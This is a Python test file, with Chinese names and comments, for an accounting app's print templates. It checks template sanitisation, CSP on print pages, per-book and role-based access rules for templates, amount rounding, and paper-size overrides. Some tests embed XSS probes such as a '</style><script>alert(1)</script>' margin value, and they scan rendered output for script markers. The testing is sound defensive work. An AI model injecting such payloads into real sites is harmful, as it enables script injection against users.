def test_页边距超区间被夹住():
    """页边距注入不进（float 兜底），但负数/超大值会让整页空白或错位。"""
    m = validate_template("VOUCHER", {"margins": {"top": -50, "left": 9999}})["margins"]
    assert m["top"] == 0
    assert m["left"] == 100


def test_元素坐标和线宽不收垃圾值():
    """元素的 x/y/w/h/line_width 会拼进 style 属性，同样只收区间内的数。"""
    els = validate_template("VOUCHER", {"elements": [
        {"type": "line", "x": "nan", "y": "inf", "w": "abc",
         "line_width": "999", "line_style": "url(evil)"},
    ]})["elements"]
    assert els[0]["x"] == 5 and els[0]["y"] == 5      # NaN/Infinity 退回默认
    assert 1 <= els[0]["w"] <= 100
    assert els[0]["line_width"] == 3                  # 夹上界
    assert els[0]["line_style"] == "solid"           # 非白名单退回 solid


def test_攻击载荷渲染后不含脚本():
    """端到端：存进去的恶意模板渲染出来必须没有 <script>。"""
    tpl = validate_template("VOUCHER", {
        "font": {"family": XSS_FONT_FAMILY, "size": 10},
        "title": {"align": XSS_ALIGN, "size": XSS_SIZE},
        "subtitle": {"align": XSS_ALIGN, "size": XSS_SIZE},
    })
    for html in (render_voucher_sheet(tpl, {}, [_voucher()], 1, 1),
                 render_table_page(tpl, {}, [], 1, 1)):
        assert "<script" not in html
        assert "alert(1)" not in html and "alert(2)" not in html
        assert "fetch(" not in html


def test_未校验的脏模板渲染时也不出脚本():
    """**防御纵深**：模板可能来自校验逻辑上线之前的老数据，或有人直接改库。

    这里**完全绕过 validate_template**，直接把脏字典喂给渲染器：
    渲染层不能假设自己拿到的字典是干净的。
    """
    from app.printing.template import _page_css

    dirty = {
        "paper": "A4",
        "margins": {"top": -5, "right": "</style><script>alert(1)</script>"},
        "font": {"family": XSS_FONT_FAMILY, "size": XSS_SIZE},
        "title": {"align": XSS_ALIGN, "size": XSS_SIZE},
        "subtitle": {"align": XSS_ALIGN, "size": XSS_SIZE},
        "columns": [{"key": "label", "label": "x", "width": 10, "align": "left"}],
        "body": {},
    }
    css = _page_css(dirty)
    assert "<script" not in css and "</style>" not in css and "alert(" not in css


def test_打印页带CSP且禁脚本():
    """第二道防线：即便载荷绕过校验进了文档，CSP 也不让它执行。

    meta 标签而不是只靠响应头 —— 前端是 axios 取回源码再 srcdoc /
    document.write，走这条链路时响应头会全部丢失。
    """
    tpl = validate_template("VOUCHER", {})
    for html in (render_voucher_sheet(tpl, {}, [_voucher()], 1, 1),
                 render_table_page(tpl, {}, [], 1, 1)):
        assert 'http-equiv="Content-Security-Policy"' in html
        assert "script-src 'none'" in html
        assert "style-src 'unsafe-inline'" in html   # 内联样式是模板引擎的固有要求


def test_多页打印只包含一个文档头且保留各页内容():
    tpl = validate_template("VOUCHER", {})
    pages = [render_voucher_sheet(tpl, {}, [_voucher()], page, 3) for page in range(1, 4)]
    html = wrap_pages(pages, "预览 <3> 张")
    head, body = html.split("</head>", 1)
    assert html.count("<!DOCTYPE html>") == 1
    assert html.count("<head>") == 1
    assert html.count("<body>") == 1
    assert head.count('http-equiv="Content-Security-Policy"') == 1
    assert "Content-Security-Policy" not in body
    assert body.count('<div class="page">') == 3
    assert body.count('<p class="page-note">') == 1
    assert "预览 &lt;3&gt; 张" in body
    assert wrap_pages(pages[:1]) == pages[0]


def test_CSP不破坏内联样式和打印():
    """CSP 不能把版式打掉：内联 <style> 必须仍被放行。"""
    tpl = validate_template("VOUCHER", {"font": {"family": "黑体", "size": 12}})
    html = render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
    assert "<style>" in html and "@page" in html
    assert "黑体" in html


# ------------------------------------------------------------ P1-5 全局模板写门禁


def _create_template(client, headers, book_id, **kw):
    body = {"scope": "VOUCHER", "name": "模板", "content": {}}
    body.update(kw)
    return client.post(f"/api/books/{book_id}/print/templates", json=body, headers=headers)


def test_会计不能改全局打印模板(client, db, book, plain_user, plain_auth):
    """模板是全局的，写门禁不能只看「当前账套能不能写」。

    过去只挂 require_book_write，于是在 A 账套是会计的人能改掉
    **B 账套只读用户正在渲染的**默认模板 —— 这正是 P0-2 的爆炸半径。
    """
    from app.models import UserBook

    db.add(UserBook(user_id=plain_user.id, book_id=book.id, role="ACCOUNTANT"))
    db.commit()
    r = _create_template(client, plain_auth, book.id)
    assert r.status_code == 403, f"会计竟然能改全局模板：{r.status_code} {r.text}"


def test_负责人和管理员仍能改全局模板(client, db, book, plain_user, plain_auth, auth):
    """收紧不能把账锁死：OWNER 与管理员必须还能改。"""
    from app.models import UserBook

    db.add(UserBook(user_id=plain_user.id, book_id=book.id, role="OWNER"))
    db.commit()
    assert _create_template(client, plain_auth, book.id).status_code == 201

    r = client.post(f"/api/books/{book.id}/print/templates",
                    json={"scope": "VOUCHER", "name": "管理员模板", "content": {}},
                    headers=auth)
    assert r.status_code == 201, r.text


def test_会计改不了已有全局模板(client, db, book, plain_user, plain_auth, auth):
    """PUT / DELETE / copy 三条写路径同样要挡。"""
    from app.models import UserBook

    created = _create_template(client, auth, book.id)
    assert created.status_code == 201
    tid = created.json()["id"]

    db.add(UserBook(user_id=plain_user.id, book_id=book.id, role="ACCOUNTANT"))
    db.commit()
    for method, path in (
        ("put", f"/api/books/{book.id}/print/templates/{tid}"),
        ("delete", f"/api/books/{book.id}/print/templates/{tid}"),
        ("post", f"/api/books/{book.id}/print/templates/{tid}/copy"),
    ):
        r = client.request(method, path, json={"content": {}}, headers=plain_auth)
        assert r.status_code == 403, f"{method} {path} -> {r.status_code}"


# ------------------------------------------------------------ P1-22 舍入模式一致性


@pytest.mark.parametrize(
    "raw,want",
    [
        # 与 accounting/util.py::money（ROUND_HALF_UP）对齐。
        # 用默认的 ROUND_HALF_EVEN 会得到 0.12 / 1.00，与账上的 0.13 / 1.01 对不上：
        # 小写合计写 0.13、大写印「壹角贰分」，同一张凭证自相矛盾。
        ("0.125", "零元壹角叁分"),
        ("1.005", "壹元零角壹分"),
        ("-0.005", "负零元壹分"),
        ("2.675", "贰元陆角捌分"),
    ],
)
def test_大写金额用四舍五入而不是银行家舍入(raw, want):
    assert to_cn_capital(raw) == want

# ------------------------------------------------ P1-5 模板作用域接线（book_id）
#
# 迁移（0005/0007）给 ``print_template`` 加了 ``book_id``（NULL = 全局兜底），
# 但在那之前 ``_template`` 取的是「该 scope 下**最早创建**的默认模板」，
# 不管它属于谁：一张全局模板会流进每一个账套的打印页。这组用例钉的是
# 「本账套优先、全局兜底」这条取用口径，以及跨账套按 id 取用/写入被拒。
#
# 断言方式刻意选在**渲染结果**上，而不是直接查 ``_template`` 返回了哪一行：
# 直接断言会让用例与实现耦合，而「这个账套打出来的到底是哪张模板」才是
# 真正要紧的那件事（模板内容会进 ``<style>``，见 P0-2）。


def _mk_book_as(client, headers, name=None) -> int:
    # 名字必须每次不同：走接口建的账套是**提交**的，夹具的 rollback 撤不回来，
    # 固定名字会在同一套件里撞上「同名账套已存在」。
    import uuid

    name = name or f"作用域{uuid.uuid4().hex[:8]}"
    r = client.post("/api/books", headers=headers,
                    json={"company_name": name, "name": name, "start_year": 2026})
    assert r.status_code == 201, r.text
    return r.json()["id"]


def _mk_template(db, *, book_id, scope, name, title, is_default=True) -> int:
    """造一条默认模板并返回 id。``title`` 会出现在 ``<h1 class="doc-title">`` 里，
    用来反查「打出来的到底是哪一张」。

    ``book_id=None`` 就是「全局兜底」——迁移之前的存量数据全是这个形状。
    """
    from app.models import PrintTemplate
    from app.printing.template import validate_template

    content = validate_template(scope, {"title": {"text": title}})
    t = PrintTemplate(book_id=book_id, scope=scope, name=name,
                      paper=content.get("paper", "A4"), content=content,
                      is_default=is_default)
    db.add(t)
    db.commit()
    db.refresh(t)
    return t.id


def _printed(client, headers, book_id) -> str:
    r = client.get(f"/api/books/{book_id}/print/balance.html", headers=headers)
    assert r.status_code == 200, r.text
    return r.text


def test_明确选择内置版式不被账套默认模板替换(client, db, auth, book):
    _mk_template(db, book_id=book.id, scope="BALANCE", name="自定义默认", title="CUSTOM-DEFAULT")
    assert "CUSTOM-DEFAULT" in _printed(client, auth, book.id)
    r = client.get(f"/api/books/{book.id}/print/balance.html", headers=auth,
                   params={"template_id": 0})
    assert r.status_code == 200, r.text
    assert "CUSTOM-DEFAULT" not in r.text
    assert DEFAULT_TEMPLATES["BALANCE"]["title"]["text"] in r.text


def test_本账套模板优先_全局模板只做兜底(client, db, auth, book):
    """两个账套各有各的默认模板，各打各的；全局的那张谁也不取。

    特意让全局模板的 id **最小** —— 旧口径「最早创建的默认模板」在这种数据
    下必然取错，两张本账套的都会被它顶掉。
    """
    other = _mk_book_as(client, auth)
    glob = _mk_template(db, book_id=None, scope="BALANCE", name="全局版式",
                        title="GLOBAL-TPL")
    mine = _mk_template(db, book_id=book.id, scope="BALANCE", name="A 版式",
                        title="BOOK-A-TPL")
    theirs = _mk_template(db, book_id=other, scope="BALANCE", name="B 版式",
                          title="BOOK-B-TPL")
    assert glob < min(mine, theirs), "全局模板必须是 id 最大的那条才对，旧口径才取不到"

    a = _printed(client, auth, book.id)
    assert "BOOK-A-TPL" in a and "GLOBAL-TPL" not in a, "A 账套取的不是自己的默认模板"
    b = _printed(client, auth, other)
    assert "BOOK-B-TPL" in b and "GLOBAL-TPL" not in b, "B 账套取的不是自己的默认模板"


def test_只有全局模板的老数据_仍然打得出来(client, db, auth, book):
    """迁移前的存量模板全是 ``book_id IS NULL``：它必须继续能用。

    升级不能把老账套的版式弄丢 —— 所以它是「兜底」而不是「废弃」。
    但一旦本账套有了自己的默认模板，就轮不到它了。
    """
    _mk_template(db, book_id=None, scope="BALANCE", name="全局版式", title="GLOBAL-TPL")
    assert "GLOBAL-TPL" in _printed(client, auth, book.id)

    _mk_template(db, book_id=book.id, scope="BALANCE", name="A 版式", title="BOOK-A-TPL")
    assert "BOOK-A-TPL" in _printed(client, auth, book.id)


def test_跨账套的模板按_id_取不到(client, db, auth, book):
    """``template_id`` 是前端传来的任意整数，**不是授权凭据**。"""
    other = _mk_book_as(client, auth)
    theirs = _mk_template(db, book_id=other, scope="BALANCE", name="B 版式",
                          title="BOOK-B-TPL")

    r = client.get(f"/api/books/{book.id}/print/balance.html?template_id={theirs}",
                   headers=auth)
    assert r.status_code == 404, f"拿着别的账套的模板 id 打出了东西：{r.status_code}"

    d = client.get(f"/api/books/{book.id}/print/templates/{theirs}", headers=auth)
    assert d.status_code == 404, d.text


def test_跨账套改不了别人的模板(client, db, auth, book):
    """写路径同样要按账套收 —— 否则 book_id 只是个摆设。"""
    other = _mk_book_as(client, auth)
    theirs = _mk_template(db, book_id=other, scope="BALANCE", name="B 版式",
                          title="BOOK-B-TPL")

    for method, path in (
        ("put", f"/api/books/{book.id}/print/templates/{theirs}"),
        ("delete", f"/api/books/{book.id}/print/templates/{theirs}"),
        ("post", f"/api/books/{book.id}/print/templates/{theirs}/copy"),
    ):
        r = client.request(method, path, json={"name": "被改了"}, headers=auth)
        assert r.status_code == 404, f"{method} {path} -> {r.status_code}"

    still = client.get(f"/api/books/{other}/print/templates/{theirs}", headers=auth)
    assert still.status_code == 200 and still.json()["name"] == "B 版式"


def test_新建的模板归属当前账套(client, db, auth, book):
    from app.models import PrintTemplate

    r = client.post(f"/api/books/{book.id}/print/templates", headers=auth,
                    json={"scope": "BALANCE", "name": "新建", "content": {}})
    assert r.status_code == 201, r.text
    t = db.get(PrintTemplate, r.json()["id"])
    assert t is not None and t.book_id == book.id, "新建的模板没有归属到账套"


def test_设为默认_不会清掉别的账套的默认模板(client, db, auth, book):
    """``_clear_other_defaults`` 必须按 ``(book_id, scope)`` 分组。

    旧实现只按 scope 清，于是 A 账套「设为默认」会把 B 账套的默认模板一起
    降级 —— 表现是「在 A 账套点一下，B 账套的版式就悄悄变回去了」。
    """
    from app.models import PrintTemplate

    other = _mk_book_as(client, auth)
    old = _mk_template(db, book_id=book.id, scope="BALANCE", name="A 旧默认",
                       title="BOOK-A-OLD")
    theirs = _mk_template(db, book_id=other, scope="BALANCE", name="B 默认",
                          title="BOOK-B-TPL")

    r = client.put(f"/api/books/{book.id}/print/templates/{old}", headers=auth,
                   json={"is_default": False})
    assert r.status_code == 200, r.text
    _mk_template(db, book_id=book.id, scope="BALANCE", name="A 新默认", title="BOOK-A-NEW")

    db.expire_all()
    b = _printed(client, auth, other)
    assert "BOOK-B-TPL" in b, "A 账套「设为默认」把 B 账套的默认模板一起清掉了"
    a = _printed(client, auth, book.id)
    assert "BOOK-A-NEW" in a
    assert db.get(PrintTemplate, theirs).is_default is True


# --------------------------------------------------------------------- 打印时临时改纸型
#
# ``paper`` / ``orientation`` 回答的是「**这一次**打印用哪张纸」，不是
# 「把模板改成哪张纸」。临时换纸是常事 —— 打一张 A4 给领导签字，再打 A5 存进
# 凭证册第二层；而为这个去改默认模板，等于把整本账的默认纸型都换掉，之后
# 每一次正常打印都得记得改回来。改回来这件事必然有人忘。


def _page_size(doc: str) -> str:
    """从打印页里取出 ``@page { size: … }`` 里的那一段。"""
    return re.search(r"@page \{ size: ([^;]+);", doc).group(1)


def test_改纸型只影响这一次打印(client, auth, book):
    """不带参数是模板自己的版式，传了 paper 就换一张 —— 打印完自动换回。"""
    url = f"/api/books/{book.id}/print/balance.html"
    assert _page_size(client.get(url, headers=auth).text) == "A4 landscape"
    assert _page_size(client.get(url, params={"paper": "B5", "orientation": "portrait"},
                                 headers=auth).text) == "176mm 250mm"


def test_改方向纵向横向互换(client, auth, book):
    """纵向模板转横向，以及转回来。"""
    url = f"/api/books/{book.id}/print/general-ledger.html"
    assert _page_size(client.get(url, headers=auth).text) == "A4"
    assert _page_size(client.get(url, params={"orientation": "landscape"},
                                 headers=auth).text) == "A4 landscape"


def test_非A4A5纸型的方向体现在宽高顺序上(client, auth, book):
    """B5 没有 CSS 关键字写法，方向只能靠宽高互换体现出来。"""
    url = f"/api/books/{book.id}/print/balance.html"
    portrait = _page_size(client.get(url, params={"paper": "B5", "orientation": "portrait"},
                                     headers=auth).text)
    landscape = _page_size(client.get(url, params={"paper": "B5", "orientation": "landscape"},
                                      headers=auth).text)
    assert (portrait, landscape) == ("176mm 250mm", "250mm 176mm")


def test_未知纸型当场报错而不是悄悄退回A4(client, auth, book):
    """退化会让「我明明选了 A3」和实际拿到的纸对不上，必须当场说清楚。"""
    r = client.get(f"/api/books/{book.id}/print/balance.html",
                   params={"paper": "泰坦纸"}, headers=auth)
    assert r.status_code == 400
    assert "不支持的纸型" in r.json()["detail"]


def test_未知方向报错(client, auth, book):
    r = client.get(f"/api/books/{book.id}/print/balance.html",
                   params={"orientation": "diagonal"}, headers=auth)
    assert r.status_code == 400
    assert "不支持的方向" in r.json()["detail"]


def test_横版纸型强制横向(client, auth, book):
    """``A4_LANDSCAPE`` 这个纸名本身就表示横版，显式传 portrait 也扳不回来。"""
    url = f"/api/books/{book.id}/print/balance.html"
    alone = client.get(url, params={"paper": "A4_LANDSCAPE"}, headers=auth)
    forced = client.get(url, params={"paper": "A4_LANDSCAPE", "orientation": "portrait"},
                        headers=auth)
    assert forced.status_code == 200, forced.text
    assert _page_size(forced.text) == _page_size(alone.text)


def test_覆盖不写库_下一次打印拿回原来的纸型(client, auth, book):
    """临时换纸最怕的是「换着换着把模板换了」—— 存起来的那份必须纹丝不动。"""
    tpl_id = client.post(f"/api/books/{book.id}/print/templates",
                         json={"scope": "BALANCE", "name": "A3 账套",
                               "content": {"paper": "A3"}}, headers=auth).json()["id"]
    params = {"template_id": tpl_id}

    printed = client.get(f"/api/books/{book.id}/print/balance.html",
                         params={**params, "paper": "A5", "orientation": "portrait"},
                         headers=auth)
    assert _page_size(printed.text) == "A5"

    again = client.get(f"/api/books/{book.id}/print/balance.html",
                       params=params, headers=auth)
    assert _page_size(again.text) == "420mm 297mm"        # A3 横版，没被改掉
    stored = client.get(f"/api/books/{book.id}/print/templates/{tpl_id}", headers=auth).json()
    assert stored["content"]["paper"] == "A3"
    assert stored["paper"] == "A3"


def test_凭证改纸型会连每页张数一起改(client, auth, book, periods, make_voucher):
    """纸型同时决定「一页放几张」：A4 两张、A5 一张。

    这不是顺带发生的副作用，是这张纸本来就能放几张 —— 换成 A5 还硬塞两张，
    打出来就是两张叠在一起，谁也读不了。
    """
    make_voucher("2026-01-05", dr=[("1001", 10, "x")], cr=[("5001", 10, "x")],
                 posted=True)
    make_voucher("2026-01-06", dr=[("1001", 20, "y")], cr=[("5001", 20, "y")],
                 posted=True)
    url = f"/api/books/{book.id}/print/vouchers.html"

    a4 = client.get(url, params={"period_id": periods[1].id}, headers=auth)
    assert a4.text.count('<div class="page">') == 1        # 两张凭证挤一页
    a5 = client.get(url, params={"period_id": periods[1].id, "paper": "A5"},
                    headers=auth)
    assert a5.text.count('<div class="page">') == 2        # 一页一张 → 两张纸


def test_两个参数都不给时原样返回同一个对象():
    """不复制 —— 「为了打印而凭空多一份字典」是没人看得见的开销。"""
    from app.api.printing import _with_paper
    from app.printing.template import validate_template

    tpl = validate_template("VOUCHER", {})
    assert _with_paper(tpl, None, None) is tpl


def test_覆盖只改副本不动模板本身():
    from app.api.printing import _with_paper
    from app.printing.template import validate_template

    tpl = validate_template("VOUCHER", {"paper": "A3", "orientation": "portrait"})
    out = _with_paper(tpl, "A5", "landscape")
    assert (out["paper"], out["orientation"]) == ("A5", "landscape")
    assert (tpl["paper"], tpl["orientation"]) == ("A3", "portrait")
